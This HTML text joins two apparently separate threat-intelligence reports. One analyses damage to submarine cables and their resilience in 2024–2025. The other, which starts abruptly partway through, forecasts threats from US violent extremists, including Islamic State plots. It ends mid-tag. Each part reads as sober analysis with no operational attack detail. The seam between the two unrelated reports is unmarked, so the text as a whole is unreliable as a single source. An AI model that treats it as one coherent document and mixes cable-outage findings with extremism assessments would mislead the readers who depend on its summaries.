        <p>Without a significant expansion of dedicated repair vessels, repair capacity is very likely to lag behind demand, pushing median restoration times beyond the current 40‑day benchmark. National permitting delays and conflict zone access restrictions will likely extend repair times further, making streamlined diplomatic clearance processes an increasingly critical element of submarine cable resilience. Satellite and microwave links will almost certainly remain partial stop‑gaps, restoring only a fraction of lost bandwidth during major outages. To mitigate these challenges, joint public-private partnerships investing in repair and maintenance capabilities, improving real-time monitoring and security measures around submarine cable infrastructure, and conducting comprehensive stress tests are critical to improving resilience and guarding against a low-probability but high-impact event in which damages to multiple cables cause prolonged connectivity issues.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Insikt Group identified a total of 44 publicly reported cable damages in 2024 and 2025 occurring in 32 distinct groupings. Unknown causes accounted for the largest number of damages (31%), followed by anchor dragging (25%) and seismic activity or other natural phenomena (16%).</li>
          <li>Of the identified cable damages, three caused significant and prolonged outages. These cases indicate that three factors –– lack of redundancy, lack of diversity of cable routes, and limited repair capacity –– very likely raise the risk of severe impact from damages to submarine cables.</li>
          <li>Insikt Group identified four incidents in the Baltic Sea involving eight distinct submarine cable damages and five incidents around Taiwan involving five distinct submarine cable damages in 2024 and 2025, four of which involved China- or Russia-linked vessels with opaque ownership or suspicious maneuvers near the damaged cables.</li>
          <li>Geopolitical tensions –– namely, Russia’s war against Ukraine and China’s coercive actions toward Taiwan –– very likely remain the primary drivers of state-linked sabotage activity targeting submarine cables.</li>
          <li>Joint public-private partnerships promoting investment in cable repair and maintenance capabilities, enhancing security and surveillance of critical submarine infrastructure, and improving resilience in current and future cable networks will be critical to addressing rising threats to cable infrastructure.</li>
        </ul>
        <h2>Background</h2>
        <p>There are <a href="https://submarine-cable-map-2025.telegeography.com/">currently</a> 597 subsea cables in operation or under construction as of April 2025, <a href="https://submarine-cable-map-2024.telegeography.com/">compared</a> to 559 subsea cables in 2024. These cables account for an <a href="https://www.itu.int/digital-resilience/submarine-cables/">estimated</a> 99% of international data traffic, representing critical infrastructure underpinning global telecommunications and financial flows. In 2024, 24 new cable systems <a href="https://subtelforum.com/submarine-telecoms-industry-report/">came</a> online, according to the Submarine Telecoms Forum (SubTel Forum) –– eight in the Europe-Middle East-Africa region, six in Oceania, four in the Indian Ocean, four in the Americas, and two transpacific systems.</p>
        <p>Among commercial suppliers of cable systems, three companies –– France’s Alcatel, the US’s SubCom, and Japan’s NEC –– <a href="https://subtelforum.com/submarine-telecoms-industry-report/">lead</a> in the number of systems delivered, kilometers of cable produced, and future systems planned, although China’s HMN Technologies (Hengtong) is playing an increasing role. Between 2020 and 2024, Alcatel delivered 23 systems, SubCom delivered thirteen, NEC ten, and HMN seven. Alcatel, the largest player, is also involved in nine planned future cable systems, representing 39% of future projects, while NEC is involved in four (17%) and SubCom two (9%).</p>
        <p>There are approximately 80 vessels globally <a href="https://subtelforum.com/submarine-telecoms-industry-report/">dedicated</a> to maintaining and expanding submarine cable infrastructure, with the United Kingdom’s (UK) Global Marine Systems (13%), France’s Orange Marine (13%), SubCom (11.6%), Alcatel Submarine Networks (ASN) (10%) and Malaysia’s Optic Marine Services (10%) owning the most vessels.</p>

          </div>
        </div>
        <p>Damage to submarine cables is not uncommon, with an average of 150 to 200 faults <a href="https://www.itu.int/en/mediacentre/Pages/PR-2024-11-29-advisory-body-submarine-cable-resilience.aspx">occurring</a> globally each year, according to the International Cable Protection Committee (ICPC). Most of these faults never <a href="https://blog.telegeography.com/what-to-know-about-submarine-cable-breaks">reach</a> the threshold of public reporting, since the majority do not cause detectable issues due to the availability of alternate routes for traffic. From 2015 to 2024, SubTel Forum <a href="https://subtelforum.com/submarine-telecoms-industry-report/">identified</a> a total of 237 publicized cable fault incidents globally –– likely a fraction of the total cable faults –– the vast majority of which were attributable to human activities, namely fishing and anchor dragging. Regionally, the “AustralAsia” region <a href="https://subtelforum.com/submarine-telecoms-industry-report/">accounted</a> for 36.3% of all reported faults during this period, making it the most fault-prone area, followed by Europe, the Middle East, and Africa (28.7%) and the Americas (20.3%) The ICPC <a href="https://www.iscpc.org/publications/submarine-cable-protection-and-the-environment/">reports</a> that the most common cause of cable damage is a ship anchor or fishing equipment contacting a cable in depths of less than 200 meters. Undersea abrasion and natural phenomena –– such as underwater rockslides and seismic activity –– <a href="https://www.kentik.com/blog/diving-deep-into-submarine-cables-undersea-lifelines-of-internet-connectivity/">account</a> for approximately 10% of faults.</p>
        <p>While cable faults are relatively common, they require significant resources to repair; the ICPC <a href="https://www.csis.org/analysis/safeguarding-subsea-cables-protecting-cyber-infrastructure-amid-great-power-competition">reports</a> that cable repairs average between $1 and $3 million, require “specialized cable ships with highly trained crews,” and can take months to complete.</p>
        <h2>Submarine Cable Risk Environment</h2>
        <p>Submarine cable systems very likely continue to face an escalating risk environment, driven in part by increasing geopolitical tensions –– aligning with our July 2023 <a href="/research/escalating-global-risk-environment-submarine-cables">assessment</a>. In 2024, SubTel Forum –– a leading industry platform for submarine cable analysis and reporting –– reported 46 incidents, the highest figure since it began publishing data on subsea cable faults in 2013 and a sharp uptick from the fifteen reported in 2023. This corresponds to heightened public awareness of submarine cable vulnerabilities amid several recent high-profile damages and related concerns about intentional malicious actions, such as sabotage –– although the increase may be partially attributable to increased reporting on subsea cable faults, as opposed to strictly reflecting an increase in incidents. However, most recent incidents have not resulted in prolonged connectivity disruptions.</p>
        <p>An assessment of the three most impactful damages in 2024 and 2025 –– located in the Red Sea, West Africa, and South Africa –– indicates that the greatest threat to submarine cables is almost certainly where damages occur in areas with limited redundancy and repair capacity, regardless of whether the result of malicious targeting driven by geopolitical interests, unintentional human activity, or natural phenomena.</p>
        <h3>Most Impactful Cable Damages of 2024–2025</h3>
        <p>Insikt Group identified 44 publicly reported submarine cable damages occurring in 32 groupings in 2024 and 2025 (<strong>Appendix A</strong>). Of these, three cases caused damage to multiple submarine internet cables resulting in substantial and prolonged disruption to internet and telecommunications traffic. In each case, disruption to services resulted from damages to multiple submarine cables at once, with the most impacted countries lacking reliable alternative routes for traffic, exacerbated by limited repair capabilities and permitting issues that prolonged repair timelines.</p>
        <ul>
          <li>In February 2024, a UK-owned vessel struck by a Houthi-fired missile sank in the Red Sea, damaging the Asia Africa Europe-1 (AAE-1), Europe India Gateway (EIG), and SEACOM cables and <a href="https://www.kentik.com/blog/what-caused-the-red-sea-submarine-cable-cuts/">disrupting</a> 25% of traffic between Asia, Europe, and the Middle East. According to Hong Kong telecommunications company HGC Global Communications, the damage <a href="https://www.hgc.com.hk/press-releases/statement-hgc-global-communications-takes-swift-action-in-response-to-submarine-cable-damage-in-the-red-sea">caused</a> “a significant impact on communication networks in the Middle East.”</li>
          <li>In March 2024, an underwater rock slide <a href="https://www.internetsociety.org/resources/doc/2024/2024-west-africa-submarine-cable-outage-report/">damaged</a> four submarine cables off West Africa: the West African Cable System (WACS), Africa Coast to Europe (ACE), MainOne, and SAT-3 cables. NetBlocks reported disruptions to internet connections in at least sixteen Central and West African countries, with disruptions to mobile payments and cloud applications for several days. CloudFlare <a href="https://blog.cloudflare.com/undersea-cable-failures-cause-internet-disruptions-across-africa-march-14-2024/">reported</a> a significant impact on a total of thirteen countries. In Liberia, disruptions lasted more than twelve hours. The outage also <a href="https://punchng.com/submarine-cable-repairs-may-last-five-weeks-mainone/">left</a> multiple Nigerian banks offline, severely <a href="https://www.bbc.com/news/world-africa-68569022">impacted</a> connectivity in Ghana, and <a href="https://subtelforum.com/8m-to-restore-subsea-cable-services/">incurred</a> estimated repair costs of $8 million.</li>
          <li>In May 2024, damage to two cables off the coast of South Africa –– SEACOM and the Eastern Africa Submarine System (EASSy) –– significantly <a href="https://www.internetsociety.org/resources/doc/2024/2024-east-africa-submarine-cable-outage-report/">reduced</a> connectivity between East and South Africa, and caused internet outages for Kenya and several other East African countries. According to <a href="https://x.com/netblocks/status/1790043208811954435">Netblocks</a>, the cut disrupted internet services in twelve countries, with Tanzania, Mozambique, and Malawi particularly affected.</li>
        </ul>
        <h3>Risk Factors for Submarine Cable Systems</h3>
        <p>Three primary factors –– lack of redundancy, lack of diversity of cable routes, and limited repair capacity –– very likely raise the likelihood of severe outages caused by damage to submarine cables. Additionally, permitting issues stemming from different regulatory environments and geopolitical tensions can extend the timeline for cable repairs, as can kinetic conflicts in the vicinity of cable breaks.</p>
        <h4>Lack of Redundancy</h4>
        <p><strong>Jurisdictions with limited alternate options to reroute traffic are most vulnerable to prolonged or significant disruptions.</strong> Following the May 2024 damages to SEACOM and EASSy, Kenya rerouted traffic to the TEAMS cable, with Safaricom and Airtel reporting they had activated alternative connectivity, but Tanzania experienced greater disruption due to its fewer connectivity options (<strong>Figure 2</strong>). In this case, the earlier February 2024 Red Sea damages further limited alternate options for connectivity, with Microsoft <a href="https://www.connectingafrica.com/connectivity/multiple-cable-failures-impact-africa-s-internet">stating</a> that the two incidents together “had reduced the total network capacity for most of Africa’s regions.” By contrast, Cloudflare <a href="https://blog.cloudflare.com/resilient-internet-connectivity-baltic-cable-cuts/">reported</a> that two cable cuts in November 2024 in the Baltic Sea –– the BCS East-West Interlink connecting Sweden and Lithuania, and the C-Lion1 cable connecting Finland and Germany –– “resulted in little-to-no observable impact to the affected countries … in large part because of the significant redundancy and resilience of Internet infrastructure in Europe.” Highlighting the importance of redundancy measures, the European Commission <a href="https://digital-strategy.ec.europa.eu/en/library/recommendation-security-and-resilience-submarine-cable-infrastructures">reported</a> in 2024 that “many islands in the Union, including the three island Member States [Cyprus, Ireland, and Malta], as well as the EU outermost regions and overseas countries and territories, are almost entirely dependent on such submarine cables for intra-Union communications,” indicating a likely higher level of vulnerability.</p>

        <p><strong>While satellites provide edge connectivity and connect locations that do not have easy access to physical infrastructure, they account for a small amount of overall global capacity and typically cannot replace fiber-optic submarine cables, which also</strong> <strong><a href="https://theconversation.com/in-our-wi-fi-world-the-internet-still-depends-on-undersea-cables-49936">move</a></strong> <strong>large amounts of data faster and more cheaply.</strong> TeleGeography <a href="https://www2.telegeography.com/submarine-cable-faqs-frequently-asked-questions">reports</a> that “cables can carry far more data at far less cost than satellites,” and only a small percentage of intercontinental data traffic is transmitted via satellite, according to <a href="https://blog.cloudflare.com/undersea-cable-failures-cause-internet-disruptions-across-africa-march-14-2024/">Cloudflare</a>. For example, the US Federal Communications Commission (FCC) <a href="https://www.fcc.gov/circuit-status-report">reports</a> that satellites account for just 0.37% of all US international capacity. According to the <a href="https://www.iscpc.org/information/frequently-asked-questions/">ICPC</a>, “a trans-pacific fibre-optic call need only travel about 5,000 miles point-to-point,” compared to a satellite call, which must travel 22,235 miles from the Earth to a satellite and then another 22,235 back. Illustrating this, a backup microwave system was <a href="https://www.enisa.europa.eu/publications/undersea-cables">activated</a> following damages to two submarine cables connecting Taiwan and the Matsu Islands in February 2023, but only restored an estimated 5% of the bandwidth that the cables had provided, with full internet access not restored until April 2023.</p>
        <h4>Lack of Diversity of Cable Routes</h4>
        <p><strong>Deploying submarine cables along similar geographic routes very likely increases systemic risk by creating single points of failure.</strong> Countries with multiple submarine cables routed along varying geographic routes are more insulated from major connectivity losses; conversely, those with fewer connecting cables, placed in close proximity to each other, are almost certainly more susceptible to multiple cable damages and associated disruptions. Recent incidents of damage to multiple cables at once indicate that threat actors could attempt to exploit the concentration of cables along similar routes in an effort to cause prolonged outages across a geographic area. For example, the Red Sea cable cuts in February 2024, detailed above, illustrated the importance of route diversity. The March 2024 damages to four cables off West Africa, which all occurred due to an underwater landslide in the “Le Trou Sans Fond” canyon off of Côte d’Ivoire, <a href="https://www.internetsociety.org/resources/doc/2024/2024-west-africa-submarine-cable-outage-report/">illustrated</a> how a concentration of cables at one point can make multiple cables susceptible to human-made threats or, as in this case, natural phenomena (<strong>Figure 3</strong>). Similarly, Egypt is a critical internet chokepoint through which multiple submarine cables <a href="https://www.kentik.com/blog/outage-in-egypt-impacted-aws-gcp-and-azure-interregional-connectivity/">connecting</a> Europe, Africa, and Asia run; the vulnerabilities associated with this arrangement were <a href="https://blog.cloudflare.com/aae-1-smw5-cable-cuts/">apparent</a> <a href="https://www.datacenterdynamics.com/en/news/aae-1-cable-cut-causes-widespread-outages-in-europe-east-africa-middle-east-and-south-asia/">following</a> June 2022 damages to both the AAE-1 and the SeaMeWe-5 cables. In December 2024, the US Department of Homeland Security <a href="https://www.dhs.gov/sites/default/files/2024-12/24_1218_scrc_Priorities-for-DHS-Engagement-on-Subsea-Cable-Security-Resilience_18-Dec-24.pdf">noted</a> that “while incidents in geographic chokepoints are relatively rare, each one brings much-needed attention to the vulnerability of similarly concentrated cables around the world.”</p>

        <p><strong>The concentration of submarine cables at a single cable landing station</strong> <strong><a href="https://blog.telegeography.com/why-does-diversity-matter-for-submarine-cables">increases</a></strong> <strong>the likelihood that damage to or near a landing site will impact multiple cables.</strong> These stations <a href="https://www.itu.int/en/ITU-D/Regional-Presence/AsiaPacific/SiteAssets/Pages/Events/2017/Submarine%20Cable/submarine-cables-for-Pacific-Islands-Countries/Cable%20Landing%20Stations%20SNCC.pdf">provide</a> multiple functions, including supplying power to the cable and connecting it to terrestrial networks, and their locations are often <a href="https://www.kentik.com/blog/diving-deep-into-submarine-cables-undersea-lifelines-of-internet-connectivity/">chosen</a> <a href="https://www.nato-pa.int/download-file?filename=/sites/default/files/2023-04/032%20STC%2023%20E%20-%20CRITICAL%20MARITIME%20INFRASTRUCTURE%20-%20FRIDBERTSSON%20REPORT.pdf">based</a> on access to existing infrastructure or regulatory factors, rather than because they offer particularly high protection from natural disasters or physical threats, such as sabotage or surveillance. As a result, cables frequently cluster around or at the same landing site –– <a href="https://www.atlanticcouncil.org/wp-content/uploads/2021/09/Cyber-defense-across-the-ocean-floor-The-geopolitics-of-submarine-cable-security.pdf">raising</a> the threat that sabotage or espionage operations could impact multiple cables at once by targeting landing stations. For example, according to the US FCC, landing sites on the southeastern US coast are <a href="https://transition.fcc.gov/bureaus/pshs/advisory/csric5/WG4A_Final_091416.pdf">clustered</a> in three primary locations in Florida, with nearly all landing sites developed to support multiple submarine cables. In October 2022, cybersecurity company Zscaler <a href="https://trust.zscaler.com/zscloud.net/posts/12256">warned</a> that cuts to multiple cables at landing stations in Marseille linking the city to Milan, Barcelona, and Lyon “impacted major cables with connectivity to Asia, Europe, US and potentially other parts of the world.” In August 2023, the European Union Agency for Cybersecurity (ENISA) <a href="https://www.enisa.europa.eu/publications/undersea-cables">reported</a> that landing stations represent a weak point in the ecosystem due to their vulnerability to “espionage attacks, deliberate power cuts, sabotage attacks with explosives, or even missile attacks in the case of a military conflict.”</p>
        <h4>Limited Repair Capacity Poses Long-Term Problem</h4>
        <p><strong>Repair capacity, which continues to lag behind the expansion of submarine cable networks, almost certainly represents an underappreciated point of vulnerability in the submarine cable ecosystem.</strong> As cable systems have expanded dramatically, investment in ships that can service these cables has lagged behind, resulting in the growth of cable systems outpacing repair capacity. Most of these vessels are therefore focused on laying new cable systems, <a href="https://www.theverge.com/c/24070570/internet-cables-undersea-deep-repair-ships">constraining</a> their ability to respond immediately to cable faults. According to <a href="https://www.enisa.europa.eu/publications/undersea-cables">ENISA</a>, given the complex nature of repairs and limited repair capacity, “a coordinated attack against multiple subsea cables could have a major impact on global internet connectivity.” For example, the Léon Thévenin, a cable repair ship docked in Cape Town, South Africa, was the only vessel dedicated to serving Africa at the time of the March 2024 cable outages, extending the repair timeline. In February 2023, all five of Vietnam’s operational undersea cables <a href="https://e.vnexpress.net/news/news/vietnam-s-undersea-cable-malfunctions-right-after-getting-fixed-4623749.html">suffered</a> partial or total damage at the same time, <a href="https://e.vnexpress.net/news/news/despite-promises-of-no-stagnation-vietnam-s-internet-access-struggles-during-peak-hours-4570205.html">resulting</a> in the loss of 75% of its data transmission capacity. With nearby ships busy, repairs on all cables were not fully <a href="https://vietnamnet.vn/en/repairs-completed-on-five-broken-undersea-cables-linked-to-vietnam-2223445.html">completed</a> until late November 2023, and telecommunications firms were <a href="https://manoa.hawaii.edu/indopacificaffairs/article/entangled-southeast-asia-and-the-geopolitics-of-undersea-cables/#:~:text=In%202022%20and%202023%2C%20all,transportation%20to%20ensure%20stable%20connections.">forced</a> to purchase spare terrestrial capacity to help stabilize connections. Reflecting concerns regarding the limited availability of repair vessels, the US <a href="https://www.federalregister.gov/documents/2021/01/05/2020-29159/request-for-applications-to-be-considered-for-enrollment-in-the-cable-security-fleet">established</a> the Cable Security Fleet in 2020 with two <a href="https://www.csis.org/analysis/safeguarding-subsea-cables-protecting-cyber-infrastructure-amid-great-power-competition">dedicated</a> US-flagged cable repair ships (the CS Dependable and CS Decisive) to speed repairs to submarine cables relevant to US national security.</p>
        <p><strong>Unless significant investments are made in streamlining repair processes and expanding cable ship repair capacity, repair times are likely to continue trending upward.</strong> According to <a href="https://subtelforum.com/submarine-telecoms-industry-report/">SubTel Forum</a>, the average repair time for the restoration of cable faults has risen from 2015 to 2024, with the average repair time in 2023 consisting of 40 days. Vietnam’s five submarine cable systems, which account for most of its international bandwidth, <a href="https://subtelforum.com/aae-1-and-apg-cable-disruptions-impact-vietnams-internet/">experience</a> an average of fifteen incidents annually; prior to 2022, repairs lasted one to two months per incident, but have recently lasted longer, extending disruptions. This is almost certainly a result of the increasing gap in the rates of subsea cable infrastructure expansion and stagnating repair capabilities.</p>
        <h4>Regulatory Factors, Conflict, and Territorial Disputes Likely to Prolong Repair Timelines</h4>
        <p><strong>Regulatory hurdles, such as complex and lengthy permitting processes for repair ships that vary by national territory, likely prolong repair timelines, exacerbating the impact of limited repair capacity. Cable damage in areas subject to territorial disputes and ongoing kinetic conflicts almost certainly increases the prospect of prolonged outages due to the denial of access to repair vessels.</strong> The International Institute for Strategic Studies <a href="https://www.iiss.org/cyber-power-matrix/submarine-cables-the-achilles-heel-of-cyberspace-in-the-asia-pacific/">reports</a> that repairs in the Asia-Pacific region take up to 30 days on average from notification of an incident, compared to fifteen in North America, due to more stringent permitting requirements. For example, repairs to April 2024 damages to the SeaMeWe-5 cable in Indonesian waters, which <a href="https://www.capacitymedia.com/article/2d5m1eo5yohwx2zl557uo/news/indonesian-policy-delays-sea-me-we-5s-repair">reduced</a> Bangladesh’s internet capacity by a third, were not <a href="https://www.facebook.com/photo?fbid=885023603650209&amp;set=a.308673981285177">completed</a> until June 28, 2024, as Jakarta’s cabotage policy <a href="https://www.capacitymedia.com/article/2d5m1eo5yohwx2zl557uo/news/indonesian-policy-delays-sea-me-we-5s-repair">delayed</a> repairs for several weeks. In March 2024, telecommunications provider SEACOM <a href="https://itweb.africa/content/O2rQGMAEyPGMd1ea">reported</a> that it would likely take longer than expected to repair three cables in the Red Sea damaged by a ship hit by Houthi strikes since permitting could take up to eight weeks to obtain. The Yemeni government <a href="https://www.marineinsight.com/shipping-news/yemens-political-disputes-delay-full-repairs-of-3-submarine-internet-cables-in-the-red-sea/">refused</a> to grant permission to initiate repairs of the damaged AAE-1 cable to the cable’s operating consortium, which includes telecommunications firm TeleYemen, as one of the firm’s two branches is under the control of the Houthi group. An investigation of the consortium reportedly <a href="https://gcaptain.com/damaged-subsea-cables-repaired-in-red-sea/">delayed</a> repairs of the AAE-1 until July 2024. Further, SubTel Forum <a href="https://subtelforum.com/houthis-hit-underwater-communications-cables/">reported</a> that ongoing threats posed by the Houthi group likely limited companies that agreed to carry out repairs and incurred high premiums.</p>
        <p>Additionally, amid ongoing territorial disputes between China and the Philippines in the South China Sea, the China Coast Guard (the CCG) has attempted to block Philippine resupply operations to vessels at the Second Thomas Shoal, Scarborough Shoal, and Sabina Shoal. In addition to harassing Philippine vessels, the CCG and other Chinese forces have for decades <a href="https://www.nbr.org/publication/dynamics-of-assertiveness-in-the-south-china-sea-china-the-philippines-and-vietnam-1970-2015/">interfered</a> with vessels from other claimants in the South China Sea, as well as vessels operated by outside powers like the United States. These incidents suggest that Beijing could take similar action to block repair vessels from accessing damaged submarine infrastructure in the event of a potential escalation of tension or outbreak of hostilities around Taiwan.</p>

        </p>
        <h2>Executive Summary</h2>
        <p>The predominant threats to most public and private sector entities from United States (US)-based domestic violent extremists (DVEs) during the next twelve months will likely come in the form of targeted attacks against personnel and sabotage of facilities. These threats likely surpass the risk of DVE mass-casualty terrorist attacks due to their elevated frequency, success rate, and impact on the targeted entity’s operations. While certain categories of homegrown violent extremists (HVEs) and some DVEs will almost certainly continue to plan and threaten mass-casualty attacks, recent high-profile assassinations and assassination attempts in the US have very likely increased the probability of DVEs considering limited-scope methods. Violent extremists have almost certainly glorified the alleged perpetrators of these attacks and promoted narratives suggesting that targeted attacks against high-profile public figures more effectively achieve their political and ideological goals than mass-casualty attacks.</p>
        <p>To support attack plots and bolster their operational footprint in 2025 and early 2026, HVEs and DVEs will almost certainly continue issuing online threats; stalking, harassing, and physically approaching victims; and conducting sabotage, surveillance, disruptive demonstrations, doxing, and swatting. As in previous years, personnel and facilities associated with racial, ethnic, and religious minorities, the LGBTQIA+ community, US federal, state, local, tribal, and territorial government agencies (particularly judicial and law enforcement agencies), specific private industry sectors (defense contractors, healthcare and pharmaceutical companies, financial and insurance agencies), and critical infrastructure providers are at heightened risk from HVE and DVE threat activities during the next twelve months.</p>
        <p>Polarizing geopolitical and domestic political issues — especially conflicts in the Middle East involving Israel, the 2024 fall of the Bashar al-Assad regime in Syria, and US immigration enforcement policies — will almost certainly continue to mobilize HVEs and DVEs during the next twelve months. While expected tactics, techniques, and procedures (TTPs) associated with US violent extremists are unlikely to significantly change in the short term, DVEs and HVEs are very likely to accelerate adoption of new technologies, such as commercially available unmanned aerial vehicles (UAVs), generative artificial intelligence (AI), end-to-end encrypted communications platforms, cryptocurrencies, and 3D printing, to enhance their operational capabilities.</p>
        <p>Rapidly shifting developments in the violent extremist threat landscape in the US and changing priorities of US federal law enforcement and homeland security agencies could place more of the onus on state and local governments and the private sector to manage their own counterterrorism programming. As always, facility security initiatives and hardening soft targets will undoubtedly remain important, but recent incidents and violent extremists’ growing preference for targeted attacks against high-profile personnel suggest that executive protection is an increasingly crucial aspect of countering violent extremist threats to organizations. Organizations can mitigate threats to executives not only through reactive detection of online threats and negative sentiment campaigns, but also by proactively identifying and removing publicly available information that can be used to target personnel. Physical security teams can query the Recorded Future Intelligence Cloud’s extensive corpus of sources used by violent extremists to analyze intelligence pertaining to these and other violent extremist threats.</p>
        <h2>Key Findings</h2>
        <p>During the next twelve months:</p>
        <ul>
          <li>The US will very likely face a heightened threat from violent extremist physical threat activities due to the enduring influence of the Israel-Hamas conflict; geopolitical developments in the Middle East, Central Asia, and Africa favoring foreign terrorist organizations (FTOs); and the increasing ease of access to and use of new and developing technologies.</li>
          <li>While their preferred targets vary, most violent extremist threat actors are almost certainly interested in threatening US federal, state, and local governments. Critical infrastructure providers, defense contractors, and the education, insurance, healthcare, banking, finance, and maritime industry sectors also very likely face heightened risks.</li>
          <li>Islamic State (IS) supporters will very likely represent the most lethal HVE threat to the US, especially if IS experiences a resurgence in Syria following the 2024 fall of the al-Assad government.</li>
          <li>HVEs with a nexus to Hamas, Hezbollah, the Yemeni Houthis, Iraqi Shi’a militias, or other “Axis of Resistance” groups are unlikely to carry out attacks in the US, but they likely have increased motivation to do so and access to expanded facilitative resources due to the US’s direct involvement in the Iran-Israel conflict.</li>
          <li>The DVE groups that likely pose the largest threat of conducting violent attacks in the US, such as neo-Nazi accelerationists, anti-government/anti-authority violent extremists (AGAAVEs) motivated by political animus, and anarchist violent extremists (AVEs), are likely to increasingly prefer targeted attacks and assassinations over mass-casualty attack plots.</li>
          <li>Militia violent extremists (MVEs), AVEs, and AGAAVEs harboring political grievances due to US domestic political issues will almost certainly physically threaten judges, public officials, business executives, and other high–profile public figures.</li>
        </ul>
        <h2>Background</h2>
        <p>Insikt Group’s forecast is predicated on its assessments of open-source information on the activities of HVEs and DVEs in the US, including the Recorded Future Intelligence Cloud’s extensive index of HVE and DVE communications on various online platforms. During the past twelve months, Insikt Group researchers curated several hundred HVE and DVE sources, adding them to an extensive index of preexisting sources of this type.</p>
        <p>This report defines “homegrown violent extremist,” “domestic violent extremist,” and several categories of HVEs and DVEs based on the US Intelligence Community’s <a href="https://www.dni.gov/files/ODNI/documents/assessments/UnclassSummaryofDVEAssessment-17MAR21.pdf">definitions and categorizations</a> of threat actors. Periodically, this report prefers definitions adopted by Insikt Group subject matter experts for analytic utility, or in instances where the US government has not officially defined a particular phenomenon or movement. A full list of terms and definitions used in this report is available in <strong>Appendix A</strong>.</p>
        <h2>Homegrown Violent Extremists</h2>
        <p>HVEs are very likely to carry out physical threat activities targeting US government and law enforcement installations and personnel, public events, large commercial spaces, houses of worship and religious communities, and counter-protestors and demonstrators. US-based IS supporters will very likely present the most lethal violent extremist threat to the US during the next twelve months, and the continued mobilization factor of the Israel-Hamas conflict will almost certainly <a href="https://www.ic3.gov/PSA/2025/PSA250605-2">drive</a> some Americans to provide support for IS, al-Qaeda, and other FTOs (although organizations other than IS and al-Shabaab — al-Qaeda’s Somalia franchise — very likely lack the infrastructure, personnel, and interest in recruiting US persons).</p>
        <p>However, while sporadic escalations in the Israel-Hamas conflict will almost certainly <a href="https://extremism.gwu.edu/sites/g/files/zaxdzs5746/files/2024-11/Pamphlet_compressed.pdf">influence</a> disruptive protest activities and other physical threats in 2025, most visibly at US universities, threat actors will likely be deterred from overt displays of support for FTOs and plotting mass-casualty attacks due to the almost certain increase in law enforcement resources <a href="https://www.justice.gov/opa/pr/justice-department-announces-launch-joint-task-force-october-7">dedicated</a> to investigating and prosecuting these threats. Instead, extant pro-Hamas networks in the US are very likely to <a href="https://www.justice.gov/usao-dc/pr/justice-department-disrupts-hamas-terrorist-financing-scheme-through-seizure">emphasize</a> covert operations, especially those that finance the organization.</p>
        <p>In addition, the geopolitical climate likely <a href="https://www.reuters.com/world/middle-east/new-orleans-attack-puts-spotlight-islamic-state-comeback-bid-2025-01-03/">favors</a> efforts by IS and al-Qaeda affiliates in the Levant, Central Asia, the Sahel, and the Horn of Africa to expand their territorial holdings, <a href="https://www.dni.gov/files/ODNI/documents/assessments/ATA-2025-Unclassified-Report.pdf">conduct</a> increasingly sophisticated and lethal attacks in their areas of operations, and <a href="https://www.understandingwar.org/backgrounder/islamic-state%E2%80%99s-global-long-game-and-resurgence-syria-poses-evolved-threat-west">develop</a> connections between their operatives and recruitment networks in Western Europe and North America.</p>
        <p>Expanding commercial markets and ease of use of developing technologies — particularly UAVs and cryptocurrencies — are very likely to bolster HVE operations on behalf of a range of FTOs in 2025. US HVEs almost certainly continue to provide financial assistance to IS, al-Qaeda, and Hamas through cryptocurrencies. For example, Hamas has almost certainly <a href="https://www.justice.gov/archives/opa/pr/global-disruption-three-terror-finance-cyber-enabled-campaigns">developed</a> a sophisticated network of cryptocurrency wallets and exchanges it uses to <a href="https://www.justice.gov/usao-dc/pr/justice-department-disrupts-hamas-terrorist-financing-scheme-through-seizure">funnel</a> funds from its international supporters to its operatives in the Palestinian Territories. HVEs are very likely to continue <a href="https://ctc.westpoint.edu/on-the-horizon-the-ukraine-war-and-the-evolving-threat-of-drone-terrorism/">experimenting</a> with these new technologies for <a href="https://ctc.westpoint.edu/printing-terror-an-empirical-overview-of-the-use-of-3d-printed-firearms-by-right-wing-extremists/">applications</a> in attack plotting, particularly with UAV-borne improvised explosive devices (IEDs) and 3D-printed firearms and weapons components.</p>
        <h3>Islamic State</h3>
        <p>The most persistent and lethal violent extremist threat to the US during the next twelve months will very likely come from IS supporters in the US who plan physical threat activities alone or in small groups, rely on minimal external direction from IS, and use less-sophisticated TTPs such as attacks with firearms, bladed weapons, and vehicular assaults. On New Year’s Day 2025, for example, Shamsud Din Jabbar <a href="https://www.fbi.gov/contact-us/field-offices/neworleans/news/fbi-releases-investigative-update-in-bourbon-street-attack">carried out</a> the first lethal attack in the US connected to IS since 2017, <a href="https://www.ic3.gov/PSA/2025/PSA250113">piloting</a> a pickup truck into a crowd in New Orleans, killing fourteen and wounding over 50. The attack followed a notable uptick in IS activity in the US; according to data from the George Washington University Program on Extremism, the US Department of Justice (DOJ) <a href="https://extremism.gwu.edu/sites/g/files/zaxdzs5746/files/2025-01/Jihadism%20Trends%20in%202024%20%281%29.pdf">arrested</a> nine IS sympathizers on federal charges in 2024, in comparison to six the year prior. These cases allegedly included major efforts by IS sympathizers to conduct mass-casualty attacks in the US, including an Oklahoma resident <a href="https://www.justice.gov/archives/opa/pr/afghan-national-arrested-plotting-election-day-terrorist-attack-name-isis">arrested</a> in October 2024 for planning to attack an election facility on Election Day and a Canada resident <a href="https://www.justice.gov/usao-sdny/pr/pakistani-national-charged-plotting-terrorist-attack-new-york-city-support-isis">arrested</a> in September 2024 for planning to enter the US and carry out a mass shooting at a Jewish community center in New York City.</p>
        <p>Insikt Group’s June 2024 <a href="https://go.recordedfuture.com/hubfs/reports/ta-2024-0611.pdf">assessment</a> that the IS Khorasan Province (ISKP) would become IS’s global “standard-bearer for external operations and media production” was largely accurate. ISKP attack planners, functioning alongside IS logistic networks in Central Asia and Türkiye and Russian-, Uzbek-, and Tajik-speaking supporters in Europe, <a href="https://www.washingtoninstitute.org/policy-analysis/islamic-states-external-operations-are-more-just-iskp">carried out</a> several major terrorist attacks in 2024. Notably, these included the January 2024 suicide bombings in Kerman, Iran, that killed over 90, as well as the March 2024 mass shooting at the Crocus City Hall in Moscow, Russia, that resulted in hundreds of casualties, including 145 dead. Attack plots connected to the ISKP were also disrupted by security services in the US, France, Germany, Austria, Belgium, and other countries, including a thwarted effort by ISKP supporters residing in Austria to <a href="https://ctc.westpoint.edu/the-august-2024-taylor-swift-vienna-concert-plot/">attack</a> a Taylor Swift concert in Vienna in August 2024. These efforts followed a lengthy and almost certainly ongoing <a href="https://jamestown.org/program/islamic-state-increasingly-targeted-and-threatened-western-sporting-events-in-advance-of-the-paris-olympics/">campaign</a> spearheaded by the al-Azaim Foundation for Media Production — ISKP’s media arm — to <a 